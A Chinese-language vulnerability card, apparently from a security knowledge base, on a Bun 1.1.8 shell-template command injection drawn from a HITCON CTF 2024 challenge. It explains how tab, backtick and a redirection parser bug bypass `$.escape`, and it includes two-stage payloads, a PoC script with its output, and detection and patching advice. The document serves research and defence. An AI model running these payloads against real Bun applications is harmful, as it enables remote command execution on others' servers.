---
id: web-nodejs-bun-shell-escape-redirect-command-injection
title: Bun 1.1.8 Shell 模板命令注入：$.escape 漏转义 tab/反引号/< + 重定向解析 bug 绕过引号
type: scenario
domain: web
path: web/nodejs
technique: bun-shell-escape-redirect-command-injection
aliases:
- Bun Shell 注入
- Bun $.escape 绕过
- Bun 命令注入
- 反引号命令替换绕过
- 重定向解析 bug
- script1<file 解析差异
- HITCON CTF 2024 echo-as-a-service
tags:
- web
- nodejs
- bun
- command-injection
- shell-escape-bypass
- redirection-parser
- backtick
- ctf
- rce
cve: []
severity: high
confidence: high
affected_versions: Bun 1.1.8（原文标记；补丁前一版本）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-08T00:04:04+08:00'
  notes: '已对照原文与3张图：图01 tab payload 直接把整串当命令名（command not found: /readflag），图02 fuzz 输出 !!1<1..!!1<A 与 Is a directory，图03 生成 - : ! ? @ # % + 0-9 A 等文件，均与卡内 two-stage 利用与重定向解析 bug 一致；SPECIAL_CHARS 补丁 diff、HITCON 2024 echo-as-a-service 源码与 sh<flag.sh 命令替换对得上。原文最终输出 hitcon{placeholder}，未本机复跑；affected_versions Bun 1.1.8 为原文明确标记。dedup 无同链重复（opencode raw/bash -lc 等为不同触发条件）。'
---

## 一句话结论

Bun 的 `$` 模板 shell 在插值用户输入时会用 `$.escape` 自动转义，但 Bun 1.1.8 的转义字符集漏掉了 `\t`、反引号 `` ` `` 和 `<`；同时 Bun shell 解析器存在重定向 bug：`name1<file` 被解析成命令 `name` 加 fd 1 重定向到 `file`，而不是命令 `name1` 加 stdin 重定向。攻击者因此可以在 `await $\`echo ${msg}\`` 这类看似安全的模板中，用 tab 分隔参数，用 `flag1<flag.sh` 把任意命令写入脚本文件，再用未转义的反引号执行 `` `sh<flag.sh` `` 命令替换，最终实现命令注入并读取 flag。

## 原理

- **Bun Shell 的默认防护**：`$\`...\`` 模板会把插值变量当作数据，用 `$.escape` 转义后再拼进命令。1.1.8 的转义字符表为 `$ > & | = ; \n { } , ( ) \ " 空格 '`（原文补丁对比中的 `SPECIAL_CHARS`）；它会将这些字符转义/包裹，使普通 `; rm -rf /tmp`、`|` 等注入失败。
- **漏掉的三个字符**：补丁把字符表扩充为包含 `~ [ ] # ; \n * { , } \` $ = ( ) 0-9 | > < & ' " 空格 \` 等，说明旧版没有把 `\t`、反引号 `` ` ``、`<` 纳入转义。Bun 的 shell 解析器又不会因为字符串被双引号包裹就忽略这些字符：tab 仍被当作参数分隔符，`<` 仍触发重定向，反引号仍触发命令替换。因此转义层“看起来加了引号”，解析层却照常解释这些元字符，形成绕过。
- **重定向解析 bug**：标准 shell 把 `./script1<file` 解析为执行 `./script1` 并把 `file` 作为 stdin；Bun shell 把结尾的 `1` 当作 fd 编号、把 `<file` 当作重定向，于是执行 `./script` 并把 stdout 重定向到 `file`。原文 fuzz 也发现 `!!1<2` 会创建文件 `2` 并把 `!!` 写入其中。这个 bug 有两个利用价值：
  - 可以用 `<` 在无需 `>`（已被转义）的情况下创建/写入文件；
  - 可以把命令字符串拆成“命令名 + 参数 + fd 重定向”的形式，绕过转义对 `>`/空格的限制。
- **两阶段利用**：
  1. 第一个 payload `"/readflag\tgive\tme\tthe\tflag1<flag.sh"`：tab 把字符串拆成多个参数，`echo` 收到的参数是 `/readflag give me the flag`；最后一个 token `flag1<flag.sh` 被 Bun 解析为参数 `flag` 加 `1<flag.sh` 重定向，于是 `echo` 把 `/readflag give me the flag` 写入 `flag.sh`（实际是伪造的“命令脚本”）。
  2. 第二个 payload `` "`sh<flag.sh`" ``：反引号未被转义，Bun 执行命令替换；`sh<flag.sh` 让 `sh` 从 `flag.sh` 读取脚本并执行，脚本内容是 setuid `/readflag give me the flag`，其输出被外层 `echo` 带回响应，拿到 flag。
- **为什么 `echo ${msg}` 仍危险**：应用开发者通常认为“插值会被自动转义”即可安全拼接命令；但转义只是黑名单替换，解析器对 tab/`<`/反引号的处理不一致，且 `<` 的 fd 解析 bug 让攻击者获得了写文件与命令替换的组合原语。核心风险是把不可信输入放进 shell 模板，而不是直接传给 `spawn` 的参数数组。

## 触发条件

- 目标使用 Bun 1.1.8（或转义字符表仍缺少 tab/反引号/`<` 的版本）的 `$` 模板执行 shell，并把用户可控字符串插入模板（如 `await $\`echo ${msg}\``）。
- 应用没有额外的输入过滤/白名单，或过滤未覆盖 tab、反引号、`<`、数字与重定向组合。
- 攻击者能控制一个完整参数或字符串（不要求控制命令名）；应用会把命令输出返回给攻击者（盲注场景也可通过写文件/带外确认）。
- 目标环境存在可执行命令/脚本（CTF 中为 setuid `readflag`），且运行用户有权限写当前目录（用于第一阶段写脚本文件）。

## 利用步骤

1. 确认 Bun 版本与转义行为：在本地用 `$.escape()` 测试 tab、反引号、`<` 是否被原样保留；构造 `await $\`echo ${input}\`` 的最小页面。
2. 第一阶段写脚本：发送包含 tab 与 `flag1<文件名` 的 payload，让 `echo` 把目标命令写入脚本文件。例如：
   ```js
   const cmd = "/readflag\tgive\tme\tthe\tflag1<flag.sh";
   await $`echo ${cmd}`;
   ```
   结果 `flag.sh` 内容为 `/readflag give me the flag`。
3. 第二阶段命令替换：发送反引号 payload，让 Bun 执行脚本：
   ```js
   const cmd = "`sh<flag.sh`";
   await $`echo ${cmd}`;
   ```
   `sh` 读取 `flag.sh` 并执行其中的 `/readflag give me the flag`，输出被 `echo` 返回。
4. 读取响应中的命令输出（原文最终得到 `hitcon{placeholder}`）。
5. 若目标没有可写的当前目录，可把第一阶段目标改为 `/tmp/<file>` 等可写路径；若命令输出不回显，可用 `<` 重定向把结果写到可读取的文件，再通过应用的文件读取接口取回。

## PoC

原文 HITCON CTF 2024 `echo-as-a-service` 场景：`index.js` 的 `/echo` 路由执行 `const output = await $\`echo ${msg}\`.text();`，`msg` 来自表单。利用脚本：

```js
import { $ } from "bun";

// 1) 用 tab 分隔参数、用 "<" 重定向把命令写入 flag.sh
let cmd = "/readflag\tgive\tme\tthe\tflag1<flag.sh";
console.log($.escape(cmd));
await $`echo ${cmd}`;

// 2) 用未转义的反引号执行 sh<flag.sh，命令替换读回 flag
cmd = "`sh<flag.sh`";
console.log($.escape(cmd));
await $`echo ${cmd}`;
```

原文运行结果（节选）：

```text
> bun req.js
/readflag       give    me      the     flag1<flag.sh
> cat flag.sh
/readflag       give    me      the     flag
> bun req.js
`sh<flag.sh`
hitcon{placeholder}
```

> 说明：`readflag` 是题目提供的 setuid 程序，要求 4 个参数 `give me the flag`；实际利用可替换为任意命令。未在本机复现。

## 变体与关联

- **同运行时命令注入**：[[web-nodejs-opencode-ai-file-find-raw-shell-injection]]、[[web-nodejs-opencode-ai-worktree-startcommand-bash-rce]]、[[web-nodejs-dokploy-destination-testconnection-rclone-command-injection]] 都是把用户输入拼进 shell 命令导致的注入；本卡的不同点是“Bun 自带转义函数 + 解析器重定向 bug”绕过引号，而不是应用层直接拼接。
- **转义/黑名单绕过**：[[web-nodejs-expression-blacklist-string-concat-process-env]] 是 Node.js 表达式黑名单绕过；本卡是 shell 转义字符集缺失 + 重定向解析差异。
- **写文件原语**：`<` 重定向被误解析为 fd 重定向，可在无 `>` 的情况下创建文件；可用于写脚本、写计划任务/ssh key 等后续链。
- **版本边界**：补丁扩充 `SPECIAL_CHARS` 后，tab/反引号/`<` 被转义，主链失效；但其他未列入字符或解析器差异仍可能被 fuzz 发现。Bun Shell 不是 POSIX shell，任何依赖“转义后即安全”的假设都应重新验证。
- 关联：[[web-generic-rce-couchdb-cve-2017-12635-12636]] 等其他 Web RCE 链。

## 检测与防御

- 修复：升级 Bun 到包含 `SPECIAL_CHARS` 补丁的版本；不要在 `$\`...\`` 模板中插入不可信输入，改用 `Bun.spawn`/`spawnSync` 的参数数组形式（不经过 shell），或对输入做严格白名单（只允许字母数字）。
- 加固：在应用层对 tab、反引号、`<`、`>`、`;`、`|`、换行等做统一过滤；把用户输入当作完整参数而非命令片段；对命令执行结果做最小化返回；限制 Web 进程的写权限与可执行命令。
- 检测：请求参数中出现 `\t`、反引号、`<数字<`/`name1<file` 等异常组合；Web 进程创建 shell/子进程并写文件；`$.escape` 输出中出现未转义的元字符；Bun 版本低于补丁版本。
- 研究：对 shell 转义函数做“转义后重新解析”的差分 fuzz，比对标准 shell 与 Bun shell 的 token 化/重定向语义，是发现此类解析差异的通用方法。
